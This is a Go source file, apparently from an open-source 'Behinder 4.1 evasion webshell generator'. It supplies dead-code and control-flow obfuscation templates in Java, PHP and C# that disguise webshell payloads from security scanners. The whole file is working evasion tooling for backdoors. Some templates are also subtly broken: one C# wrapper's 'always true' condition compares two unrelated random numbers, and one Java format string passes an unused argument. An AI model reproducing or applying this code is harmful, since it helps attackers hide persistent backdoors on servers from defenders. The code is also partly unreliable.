// Zack-BypassWeb - 冰蝎4.1 免杀Webshell生成框架
// Copyright (C) 2024 Zack
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

package evasion

import (
	"fmt"
	"Zack-BypassWeb/pkg/utils"
	"strings"
)

// DeadCode generates realistic-looking dead code blocks.
type DeadCode struct {
	language string
}

// NewDeadCode creates a dead code generator for a language.
func NewDeadCode(language string) *DeadCode {
	return &DeadCode{language: language}
}

// Generate returns a dead code block that will never execute.
func (dc *DeadCode) Generate() string {
	switch dc.language {
	case "java":
		return dc.javaDeadCode()
	case "php":
		return dc.phpDeadCode()
	case "csharp":
		return dc.csharpDeadCode()
	default:
		return ""
	}
}

func (dc *DeadCode) javaDeadCode() string {
	patterns := []string{
		// Opaque predicate: always false comparison
		fmt.Sprintf(`if (System.getProperty("%s") != null && System.getProperty("%s").length() > %d) {
    String %s = "%s"+System.getProperty("%s");
}`,
			utils.RandString(8), utils.RandString(8), utils.RandInt(10000, 99999),
			utils.RandString(6), utils.RandString(5), utils.RandString(8)),
		// Unreachable try-catch block
		fmt.Sprintf(`try {
    Class.forName("%s.%s.%s");
} catch (ClassNotFoundException %[4]s) {
    %[4]s.printStackTrace();
}`,
			utils.RandString(6), utils.RandString(5), utils.RandString(4),
			utils.RandString(5)),
		// Deadloop check
		fmt.Sprintf(`if (false && "%s".equals(System.getenv("%s"))) {
    Class.forName("%s.%s");
}`,
			utils.RandString(8), strings.ToUpper(utils.RandString(6)),
			utils.RandString(5), utils.RandString(6)),
	}
	return patterns[utils.RandInt(0, len(patterns)-1)]
}

func (dc *DeadCode) phpDeadCode() string {
	patterns := []string{
		fmt.Sprintf(`if (isset($GLOBALS['%s']) && defined('%s')) {
    $%s = '%s'.'%s';
}`,
			utils.RandString(6), strings.ToUpper(utils.RandString(5)),
			utils.RandString(4), utils.RandString(5), utils.RandString(4)),
		fmt.Sprintf(`if (false && function_exists('%s')) {
    @%s();
}`,
			utils.RandString(7), utils.RandString(8)),
		fmt.Sprintf(`$%s = php_uname('%s');
if ($%s === '%s') {
    @ini_set('%s', '%s');
}`,
			utils.RandString(5), utils.RandString(1)[:1],
			utils.RandString(5), utils.RandString(10),
			utils.RandString(6), utils.RandString(4)),
	}
	return patterns[utils.RandInt(0, len(patterns)-1)]
}

func (dc *DeadCode) csharpDeadCode() string {
	patterns := []string{
		fmt.Sprintf(`if (System.Environment.GetEnvironmentVariable("%s") != null && false) {
    var %s = "%s";
}`,
			strings.ToUpper(utils.RandString(6)),
			utils.RandString(5), utils.RandString(8)),
		fmt.Sprintf(`try {
    Type.GetType("%s.%s");
} catch (System.Exception %s) {}`,
			utils.RandString(6), utils.RandString(5),
			utils.RandString(4)),
	}
	return patterns[utils.RandInt(0, len(patterns)-1)]
}

// ControlFlowFlattener injects extra branching to obscure the real control flow.
type ControlFlowFlattener struct {
	language string
}

// NewControlFlowFlattener creates a control flow obfuscator.
func NewControlFlowFlattener(language string) *ControlFlowFlattener {
	return &ControlFlowFlattener{language: language}
}

// WrapCondition wraps executable code in an obfuscated condition.
// The condition always evaluates to true, but looks complex.
func (cff *ControlFlowFlattener) WrapCondition(code string) string {
	switch cff.language {
	case "java":
		return cff.wrapJava(code)
	case "php":
		return cff.wrapPHP(code)
	case "csharp":
		return cff.wrapCSharp(code)
	default:
		return code
	}
}

func (cff *ControlFlowFlattener) wrapJava(code string) string {
	v := utils.RandString(6)
	patterns := []string{
		fmt.Sprintf(`String %s = "%s";
if (%s != null && %s.length() == %d) {
    %s
    %s = null;
}`,
			v, utils.RandString(8), v, v, len(utils.RandString(8)),
			code, v),
		fmt.Sprintf(`if ((("%s"+"%s").hashCode() & 0xFF) > -1) {
    %s
}`,
			utils.RandString(4), utils.RandString(4), code),
		fmt.Sprintf(`for (int %[1]s = 0; %[1]s < 1; %[1]s++) {
    %s
    if (%[1]s >= 1) break;
}`,
			utils.RandString(3),
			code, utils.RandString(3)),
	}
	return patterns[utils.RandInt(0, len(patterns)-1)]
}

func (cff *ControlFlowFlattener) wrapPHP(code string) string {
	v := utils.RandString(5)
	patterns := []string{
		fmt.Sprintf(`$%s = %d;
if ($%s > %d && $%s < %d) {
    %s
}`,
			v, utils.RandInt(1000, 9999), v, utils.RandInt(500, 999), v, utils.RandInt(10000, 99999),
			code),
		fmt.Sprintf(`switch (%[1]d) {
    case %[1]d:
        %s
        break;
}`,
			utils.RandInt(1, 10), code),
		fmt.Sprintf(`for ($%[1]s = 0; $%[1]s < 1; $%[1]s++) {
    %s
}`,
			utils.RandString(3), code),
	}
	return patterns[utils.RandInt(0, len(patterns)-1)]
}

func (cff *ControlFlowFlattener) wrapCSharp(code string) string {
	v := utils.RandString(5)
	patterns := []string{
		fmt.Sprintf(`if (("%s".GetHashCode() & 0xFF) != -1) {
    %s
}`,
			utils.RandString(8), code),
		fmt.Sprintf(`var %s = %d;
if (%s == %d) {
    %s
}`,
			v, utils.RandInt(100, 999), v, utils.RandInt(100, 999), code),
	}
	return patterns[utils.RandInt(0, len(patterns)-1)]
}

